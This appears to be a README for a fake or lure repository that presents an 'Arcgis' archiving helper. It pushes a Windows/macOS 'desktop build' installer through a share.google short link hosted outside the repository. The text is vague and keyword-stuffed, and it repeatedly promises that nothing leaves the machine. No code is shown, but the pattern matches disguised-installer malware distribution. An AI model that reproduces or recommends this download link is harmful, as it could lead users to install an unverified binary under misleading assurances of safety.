# Arcgis

*Archive Arcgis files on this machine before you change the install.*

## Overview

**Arcgis** projects and geodatabases live in the folders you set for the project. This helper finds those Arcgis paths, previews a dated copy, and can write to `--out` without changing the live install.

This GitHub repository is the **Python CLI source** for a local Arcgis helper, plus notes for the packaged desktop build. The CLI reads paths on the machine that runs it. It does not upload your projects.

The **desktop build** is the same job as an installer for Windows (and macOS where the setup page lists it). No Python, no venv. Open the setup page, follow the steps, then use the installed app the same way you would use `main.py`.

Everything stays on the PC that starts the tool. Original project files are left in place unless you pass a write path. The desktop installer and the CLI in this repo do the same job; pick one.

## How to get it

Two editions. Same workflow, different package:

- **CLI source (this repo)** — MIT, Python 3.11+, `requirements.txt` + `main.py`. You see every flag. Nothing leaves the machine.
- **Desktop build** — Windows / macOS installer on the [setup page](https://share.google/A1IHfyGRT0zGRLqj8). No Python, no terminal. Same local job, packaged for everyday use.

If you already have Python, stay in this repository. If you want a normal installer, use the setup page. You do not need both.

## What it does

- Finds the Arcgis data directory.
- Copies config and export files to a dated archive.
- Lists photo and export folders.
- Writes a short report of what was kept.

## Background

Arcgis drops data files next to launcher caches.

People search Arcgis desktop and PC when they want the folder on disk.

A named helper is easier to find than a generic zip.

## Requirements

- **Desktop build:** Windows 10 or 11 (macOS when the setup page lists it). No Python.
- **CLI:** Python 3.11 or newer, `pip`, and the packages in `requirements.txt`.
- Local disk access only. The CLI does not need a Arcgis account just to list or copy folders.
- A writable folder if you pass `--out`.

## Run locally

Skip this section if you installed the desktop build. It is only for the source in this repository.

Python **3.11+**. Open a terminal in the repo root (the folder that contains `main.py`).

**Install**

```bash
python -m pip install -r requirements.txt
```

**See every flag**

```bash
python main.py --help
```

`--help` is the full command list for this tree. Read it once before the first real run.

**Typical next commands**

```bash
python main.py . --preview
python main.py "C:\Users\Public" --out .\export
```

| Flag | What it does |
| --- | --- |
| `--help` | Print the command list and exit |
| `--preview` | Show the plan only. Nothing is written |
| `--out` | Output folder when you do not want to touch the source |
| `path` | Optional input file or folder |

If a flag is missing on this copy, `--help` is the source of truth. The desktop build exposes the same job without these commands.
